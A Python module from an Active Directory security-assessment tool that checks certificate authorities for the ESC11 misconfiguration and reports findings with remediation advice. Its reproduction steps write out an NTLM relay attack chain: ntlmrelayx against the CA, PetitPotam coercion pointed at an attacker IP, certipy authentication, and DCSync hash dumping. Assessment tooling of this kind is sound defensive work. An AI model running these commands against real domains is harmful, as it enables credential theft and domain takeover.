"""ADCS ESC11 — IF_ENFORCEENCRYPTICERTREQUEST missing on CA, enables NTLM relay."""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS_ESC11 = "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
CVSS40_ESC11 = "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
# CA editFlags bit — when NOT set, CSRs don't require encryption
IF_ENFORCEENCRYPTICERTREQUEST = 0x40


class Esc11Check(BaseModule):
    """ADCS ESC11 — CA accepts unencrypted certificate requests, enabling NTLM relay."""

    NAME        = "esc11_check"
    DESCRIPTION = "Check ADCS for ESC11: CA missing IF_ENFORCEENCRYPTICERTREQUEST → NTLM relay"
    PHASE       = 11
    TAGS        = ["adcs", "esc11", "certificate", "ntlm-relay", "mitre-T1649"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        client = LdapClient(
            dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
        )
        if not client.connect():
            return self._make_result(start)

        try:
            await self._check_ca_flags(client, domain, dc_ip)
        finally:
            client.disconnect()

        return self._make_result(start)

    async def _check_ca_flags(self, client: LdapClient, domain: str, dc_ip: str) -> None:
        dc_parts  = ",".join(f"DC={p}" for p in domain.split("."))
        config_nc = f"CN=Configuration,{dc_parts}"
        cas_dn    = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{config_nc}"

        ca_objects = client.search(
            "(objectClass=pKIEnrollmentService)",
            ["cn", "dNSHostName", "cACertificate", "editFlags",
             "certificateTemplates", "msPKI-Enrollment-Servers"],
            base_dn=cas_dn,
        )

        self.log.info("Found %d CA enrollment service(s)", len(ca_objects))

        for ca in ca_objects:
            ca_name    = ca.get("cn", "Unknown")
            ca_host    = ca.get("dNSHostName", dc_ip)
            edit_flags = int(str(ca.get("editFlags") or 0))

            enforce_encrypt = bool(edit_flags & IF_ENFORCEENCRYPTICERTREQUEST)

            if not enforce_encrypt:
                templates = ca.get("certificateTemplates", [])
                if isinstance(templates, str):
                    templates = [templates]

                ev = Evidence(extra={
                    "ca_name":        ca_name,
                    "ca_host":        ca_host,
                    "edit_flags":     f"0x{edit_flags:x}",
                    "enforce_encrypt": False,
                    "templates":      list(templates)[:10],
                })
                self.new_finding(
                    title=f"ADCS ESC11 — CA '{ca_name}' Missing IF_ENFORCEENCRYPTICERTREQUEST",
                    severity=Severity.HIGH,
                    description=(
                        f"CA '{ca_name}' ({ca_host}) does not have IF_ENFORCEENCRYPTICERTREQUEST "
                        f"(0x40) set in editFlags (current: 0x{edit_flags:x}). "
                        "Certificate requests are accepted without HTTPS/encryption, "
                        "making this CA a viable NTLM relay target.\n\n"
                        "Attack chain:\n"
                        "1. Set up NTLM relay listener targeting the CA's HTTP enrollment endpoint\n"
                        "2. Coerce DC authentication (PetitPotam, PrintSpooler, etc.)\n"
                        "3. Relay DC credentials to CA → obtain DC certificate\n"
                        "4. Use DC certificate for Kerberos auth (PKINIT) → dump hashes (DCSync)"
                    ),
                    reproduction_steps=[
                        "# Setup relay to ADCS HTTP endpoint (ESC8 chain):",
                        f"impacket-ntlmrelayx -t http://{ca_host}/certsrv/certfnsh.asp "
                        "--adcs --template DomainController",
                        "# Coerce DC auth:",
                        f"python3 PetitPotam.py -u attacker -p 'Pass' -d {domain} "
                        f"<attacker_ip> {dc_ip}",
                        "# Use obtained cert to auth:",
                        f"certipy auth -pfx dc.pfx -dc-ip {dc_ip}",
                    ],
                    remediation=(
                        f"On CA '{ca_name}': enable IF_ENFORCEENCRYPTICERTREQUEST in CA properties. "
                        "Require HTTPS on the CA web enrollment endpoint. "
                        "Enable EPA (Extended Protection for Authentication) on IIS. "
                        "Disable NTLM on the CA web endpoint where possible."
                    ),
                    references=[
                        "SpecterOps ESC11 research",
                        "MITRE T1649",
                        "https://posts.specterops.io/adcs-esc11-yarc-yet-another-relay-attack-2",
                    ],
                    evidence=ev,
                    cvss_v31_vector=CVSS_ESC11,
                    cvss_v40_vector=CVSS40_ESC11,
                    mitre_attack=["TA0006/T1557.001", "TA0004/T1649"],
                    target=dc_ip,
                )
            else:
                self.log.info("CA '%s': IF_ENFORCEENCRYPTICERTREQUEST is set (not vulnerable to ESC11)", ca_name)


class TestEsc11Check:
    def test_flag_value(self) -> None:
        assert IF_ENFORCEENCRYPTICERTREQUEST == 0x40

    def test_cvss(self) -> None:
        assert CVSS_ESC11.startswith("CVSS:3.1")
